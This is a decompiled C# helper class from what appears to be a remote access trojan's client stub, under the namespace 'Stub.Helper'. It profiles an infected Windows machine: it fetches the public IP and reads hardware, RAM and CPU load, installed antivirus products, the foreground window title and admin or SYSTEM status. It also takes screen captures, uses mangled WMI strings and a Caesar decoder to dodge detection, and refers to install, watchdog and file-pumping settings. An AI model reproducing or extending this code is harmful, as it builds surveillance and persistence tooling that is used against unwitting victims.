using System;
using System.Collections.Generic;
using System.Drawing;
using System.Drawing.Imaging;
using System.IO;
using System.IO.Compression;
using System.Linq;
using System.Management;
using System.Net;
using System.Security.Cryptography;
using System.Security.Principal;
using System.Text;
using System.Windows.Forms;
using Stub.Helper.CryptString;

namespace Stub.Helper
{
	// Token: 0x02000020 RID: 32
	internal class Methods
	{
		// Token: 0x06000092 RID: 146 RVA: 0x0000235F File Offset: 0x0000055F
		public static void Exit()
		{
			MutexControl.CloseMutex();
			Environment.Exit(new Random().Next(100, 600));
		}

		// Token: 0x06000093 RID: 147 RVA: 0x00005480 File Offset: 0x00003680
		public static string GetPublicIpAsync()
		{
			try
			{
				using (WebClient webClient = new WebClient())
				{
					string text = "J";
					return webClient.DownloadString("http://icanhazip.com").Replace(Caesars.Decoding(text), "");
				}
			}
			catch
			{
			}
			return "0.0.0.0";
		}

		// Token: 0x06000094 RID: 148 RVA: 0x000054F4 File Offset: 0x000036F4
		public static string Signature(string filename)
		{
			string result;
			using (MD5 md = MD5.Create())
			{
				using (FileStream fileStream = File.OpenRead(filename))
				{
					result = BitConverter.ToString(md.ComputeHash(fileStream)).Replace("-", "").ToLowerInvariant();
				}
			}
			return result;
		}

		// Token: 0x06000095 RID: 149 RVA: 0x0000237C File Offset: 0x0000057C
		public static bool VerifFile(string source, string path)
		{
			if (Convert.ToBoolean(Settings.Pumper))
			{
				return new FileInfo(path).Length > 419430400L;
			}
			return Methods.Signature(source) == Methods.Signature(path);
		}

		// Token: 0x06000096 RID: 150 RVA: 0x00005568 File Offset: 0x00003768
		public static string Computer()
		{
			try
			{
				using (ManagementObjectSearcher managementObjectSearcher = new ManagementObjectSearcher("Seeleect * from Win3e9_ComputeerSysteem"))
				{
					using (ManagementObjectCollection managementObjectCollection = managementObjectSearcher.Get())
					{
						using (ManagementObjectCollection.ManagementObjectEnumerator enumerator = managementObjectCollection.GetEnumerator())
						{
							if (enumerator.MoveNext())
							{
								return enumerator.Current["Moedeel"].ToString();
							}
						}
					}
				}
			}
			catch
			{
			}
			return "Unkown";
		}

		// Token: 0x06000097 RID: 151 RVA: 0x00005624 File Offset: 0x00003824
		public static string GetPath(string pth)
		{
			pth = pth.Replace("%ApplicationData%", Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData));
			pth = pth.Replace("%Windows%", Environment.GetFolderPath(Environment.SpecialFolder.Windows));
			pth = pth.Replace("%UserProfile%", Environment.GetFolderPath(Environment.SpecialFolder.UserProfile));
			pth = pth.Replace("%ProgramFiles%", Environment.GetFolderPath(Environment.SpecialFolder.ProgramFiles));
			pth = pth.Replace("%Templates%", Environment.GetFolderPath(Environment.SpecialFolder.Templates));
			pth = pth.Replace("%Cookies%", Environment.GetFolderPath(Environment.SpecialFolder.Cookies));
			pth = pth.Replace("%CommonPictures%", Environment.GetFolderPath(Environment.SpecialFolder.CommonPictures));
			pth = pth.Replace("%LocalApplicationData%", Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData));
			pth = pth.Replace("%CommonDocuments%", Environment.GetFolderPath(Environment.SpecialFolder.CommonDocuments));
			pth = pth.Replace("%MyDocuments%", Environment.GetFolderPath(Environment.SpecialFolder.Personal));
			pth = pth.Replace("%MyMusic%", Environment.GetFolderPath(Environment.SpecialFolder.MyMusic));
			pth = pth.Replace("%MyVideos%", Environment.GetFolderPath(Environment.SpecialFolder.MyVideos));
			return pth;
		}

		// Token: 0x06000098 RID: 152 RVA: 0x00005760 File Offset: 0x00003960
		public static List<string> BytesToString(List<string> byteCount)
		{
			List<string> list = new List<string>();
			foreach (string value in byteCount)
			{
				list.Add(Methods.BytesToString(Convert.ToInt64(value)));
			}
			return list;
		}

		// Token: 0x06000099 RID: 153 RVA: 0x000057C0 File Offset: 0x000039C0
		public static string BytesToString(long byteCount)
		{
			return Math.Round((double)byteCount / Math.Pow(1024.0, 3.0)).ToString() + "GB";
		}

		// Token: 0x0600009A RID: 154 RVA: 0x00005804 File Offset: 0x00003A04
		public static string getCurrentCpuUsage()
		{
			string result;
			try
			{
				result = ((int)Settings.cpuCounter.NextValue()).ToString() + " %";
			}
			catch
			{
				result = "404 %";
			}
			return result;
		}

		// Token: 0x0600009B RID: 155 RVA: 0x00005858 File Offset: 0x00003A58
		public static string getAvailableRAM()
		{
			string result;
			try
			{
				using (ManagementObjectCollection.ManagementObjectEnumerator enumerator = new ManagementObjectSearcher("SELECT TotalVisibleMemorySize,FreePhysicalMemory FROM Win32_OperatingSystem").Get().GetEnumerator())
				{
					if (enumerator.MoveNext())
					{
						ManagementObject managementObject = (ManagementObject)enumerator.Current;
						ulong num = Convert.ToUInt64(managementObject["TotalVisibleMemorySize"]);
						return ((num - Convert.ToUInt64(managementObject["FreePhysicalMemory"])) * 100UL / num).ToString() + " %";
					}
				}
				result = "0 %";
			}
			catch
			{
				result = "404 %";
			}
			return result;
		}

		// Token: 0x0600009C RID: 156 RVA: 0x0000592C File Offset: 0x00003B2C
		public static List<string> GetHardwareInfo(string WIN32_Class, string ClassItemField)
		{
			List<string> list = new List<string>();
			ManagementObjectSearcher managementObjectSearcher = new ManagementObjectSearcher("SELECT * FROM " + WIN32_Class);
			try
			{
				foreach (ManagementBaseObject managementBaseObject in managementObjectSearcher.Get())
				{
					ManagementObject managementObject = (ManagementObject)managementBaseObject;
					list.Add(managementObject[ClassItemField].ToString().Trim());
				}
			}
			catch
			{
			}
			return list;
		}

		// Token: 0x0600009D RID: 157 RVA: 0x000023AF File Offset: 0x000005AF
		public static bool CheckForStartCoonnect()
		{
			return !Convert.ToBoolean(Settings.Install) || !Convert.ToBoolean(Settings.InstallWatchDog) || !(Settings.PathWatchDog == Settings.ProcessPath);
		}

		// Token: 0x0600009E RID: 158 RVA: 0x000023E1 File Offset: 0x000005E1
		public static bool IsAdmin()
		{
			return Settings.PRINCIP.IsInRole(WindowsBuiltInRole.Administrator);
		}

		// Token: 0x0600009F RID: 159 RVA: 0x000059BC File Offset: 0x00003BBC
		public static string GetUserName()
		{
			string result;
			try
			{
				result = ((string)Enumerable.First<ManagementBaseObject>(Enumerable.Cast<ManagementBaseObject>(new ManagementObjectSearcher("SELECT UseerNamee FebOM Win3e9_ComputeerSysteem").Get()))["UseerNamee"]).Split(new char[]
				{
					"\"[0]
				})[1];
			}
			catch
			{
				result = Environment.UserName;
			}
			return result;
		}

		// Token: 0x060000A0 RID: 160 RVA: 0x000023F2 File Offset: 0x000005F2
		public static bool IsSystem()
		{
			return Methods.IsAdmin() && Settings.UserName != Environment.UserName;
		}

		// Token: 0x060000A1 RID: 161 RVA: 0x00002411 File Offset: 0x00000611
		public static string RemoveLastChars(string input, int amount = 2)
		{
			if (input.Length > amount)
			{
				input = input.Remove(input.Length - amount);
			}
			return input;
		}

		// Token: 0x060000A2 RID: 162 RVA: 0x00005A38 File Offset: 0x00003C38
		public static byte[] ScreenShot()
		{
			byte[] result;
			try
			{
				Bitmap bitmap = new Bitmap(Screen.PrimaryScreen.Bounds.Width, Screen.PrimaryScreen.Bounds.Height);
				using (Graphics graphics = Graphics.FromImage(bitmap))
				{
					using (MemoryStream memoryStream = new MemoryStream())
					{
						graphics.CopyFromScreen(0, 0, 0, 0, Screen.PrimaryScreen.Bounds.Size);
						Image thumbnailImage = bitmap.GetThumbnailImage(50, 50, () => false, IntPtr.Zero);
						thumbnailImage.Save(memoryStream, ImageFormat.Jpeg);
						thumbnailImage.Dispose();
						result = memoryStream.ToArray();
					}
				}
			}
			catch
			{
				result = Encoding.UTF8.GetBytes("null");
			}
			return result;
		}

		// Token: 0x060000A3 RID: 163 RVA: 0x00005B38 File Offset: 0x00003D38
		public static string Antivirus()
		{
			string result;
			try
			{
				string text = string.Empty;
				using (ManagementObjectSearcher managementObjectSearcher = new ManagementObjectSearcher("\\" + Environment.MachineName + @"\root\SecurityCenter", "Select * from AntivirusProduct"))
				{
					foreach (ManagementBaseObject managementBaseObject in managementObjectSearcher.Get())
					{
						ManagementObject managementObject = (ManagementObject)managementBaseObject;
						text = text + managementObject["edisplayNamee"].ToString() + "; ";
					}
				}
				text = Methods.RemoveLastChars(text, 2);
				result = ((!string.IsNullOrEmpty(text)) ? text : "N/A");
			}
			catch
			{
				result = "Unknown";
			}
			return result;
		}

		// Token: 0x060000A4 RID: 164 RVA: 0x00005C34 File Offset: 0x00003E34
		public static string GetActiveWindowTitle()
		{
			try
			{
				int num = 320;
				StringBuilder stringBuilder = new StringBuilder(num);
				if (DllImport.GetWindowText(DllImport.GetForegroundWindow(), stringBuilder, num) > 0)
				{
					return stringBuilder.ToString();
				}
			}
			catch
			{
			}
			return "";
		}

		// Token: 0x060000A5 RID: 165 RVA: 0x00005C84 File Offset: 0x00003E84
		public static string GetWindowsVersion()
		{
			string result;
			try
			{
				string text = "";
				foreach (ManagementBaseObject managementBaseObject in new ManagementObjectSearcher("SELECT * FROM Win32_OperatingSystem").Get())
				{
					ManagementObject managementObject = (ManagementObject)managementBaseObject;
					text = string.Format("{0} {1}", (string)managementObject["Caption"], (string)managementObject["OSArchitecture"]);
				}
				result = text;
			}
			catch
			{
				result = "Error Get Version";
			}
			return result;
		}

		// Token: 0x060000A6 RID: 166 RVA: 0x00005D3C File Offset: 0x00003F3C
		public static byte[] Decompress(byte[] input)
		{
			byte[] result;
			using (MemoryStream memoryStream = new MemoryStream(input))
			{
				byte[] array = new byte[4];
				memoryStream.Read(array, 0, 4);
				result = Methods.Decompress2(array, memoryStream);
			}
			return result;
		}

		// Token: 0x060000A7 RID: 167 RVA: 0x00005D88 File Offset: 0x00003F88
		public static byte[] Decompress2(byte[] lengthBytes, MemoryStream source)
		{
			int num = BitConverter.ToInt32(lengthBytes, 0);
			byte[] result;
			using (GZipStream gzipStream = new GZipStream(source, 0))
			{
				byte[] array = new byte[num];
				gzipStream.Read(array, 0, num);
				result = array;
			}
			return result;
		}

		// Token: 0x060000A8 RID: 168 RVA: 0x00005DD8 File Offset: 0x00003FD8
		public static byte[] Compress(byte[] input)
		{
			byte[] result;
			using (MemoryStream memoryStream = new MemoryStream())
			{
				byte[] bytes = BitConverter.GetBytes(input.Length);
				memoryStream.Write(bytes, 0, 4);
				result = Methods.Compress2(memoryStream, input);
			}
			return result;
		}

		// Token: 0x060000A9 RID: 169 RVA: 0x00005E24 File Offset: 0x00004024
		public static byte[] Compress2(MemoryStream result, byte[] input)
		{
			using (GZipStream gzipStream = new GZipStream(result, 1))
			{
				gzipStream.Write(input, 0, input.Length);
				gzipStream.Flush();
			}
			return result.ToArray();
		}
	}
}
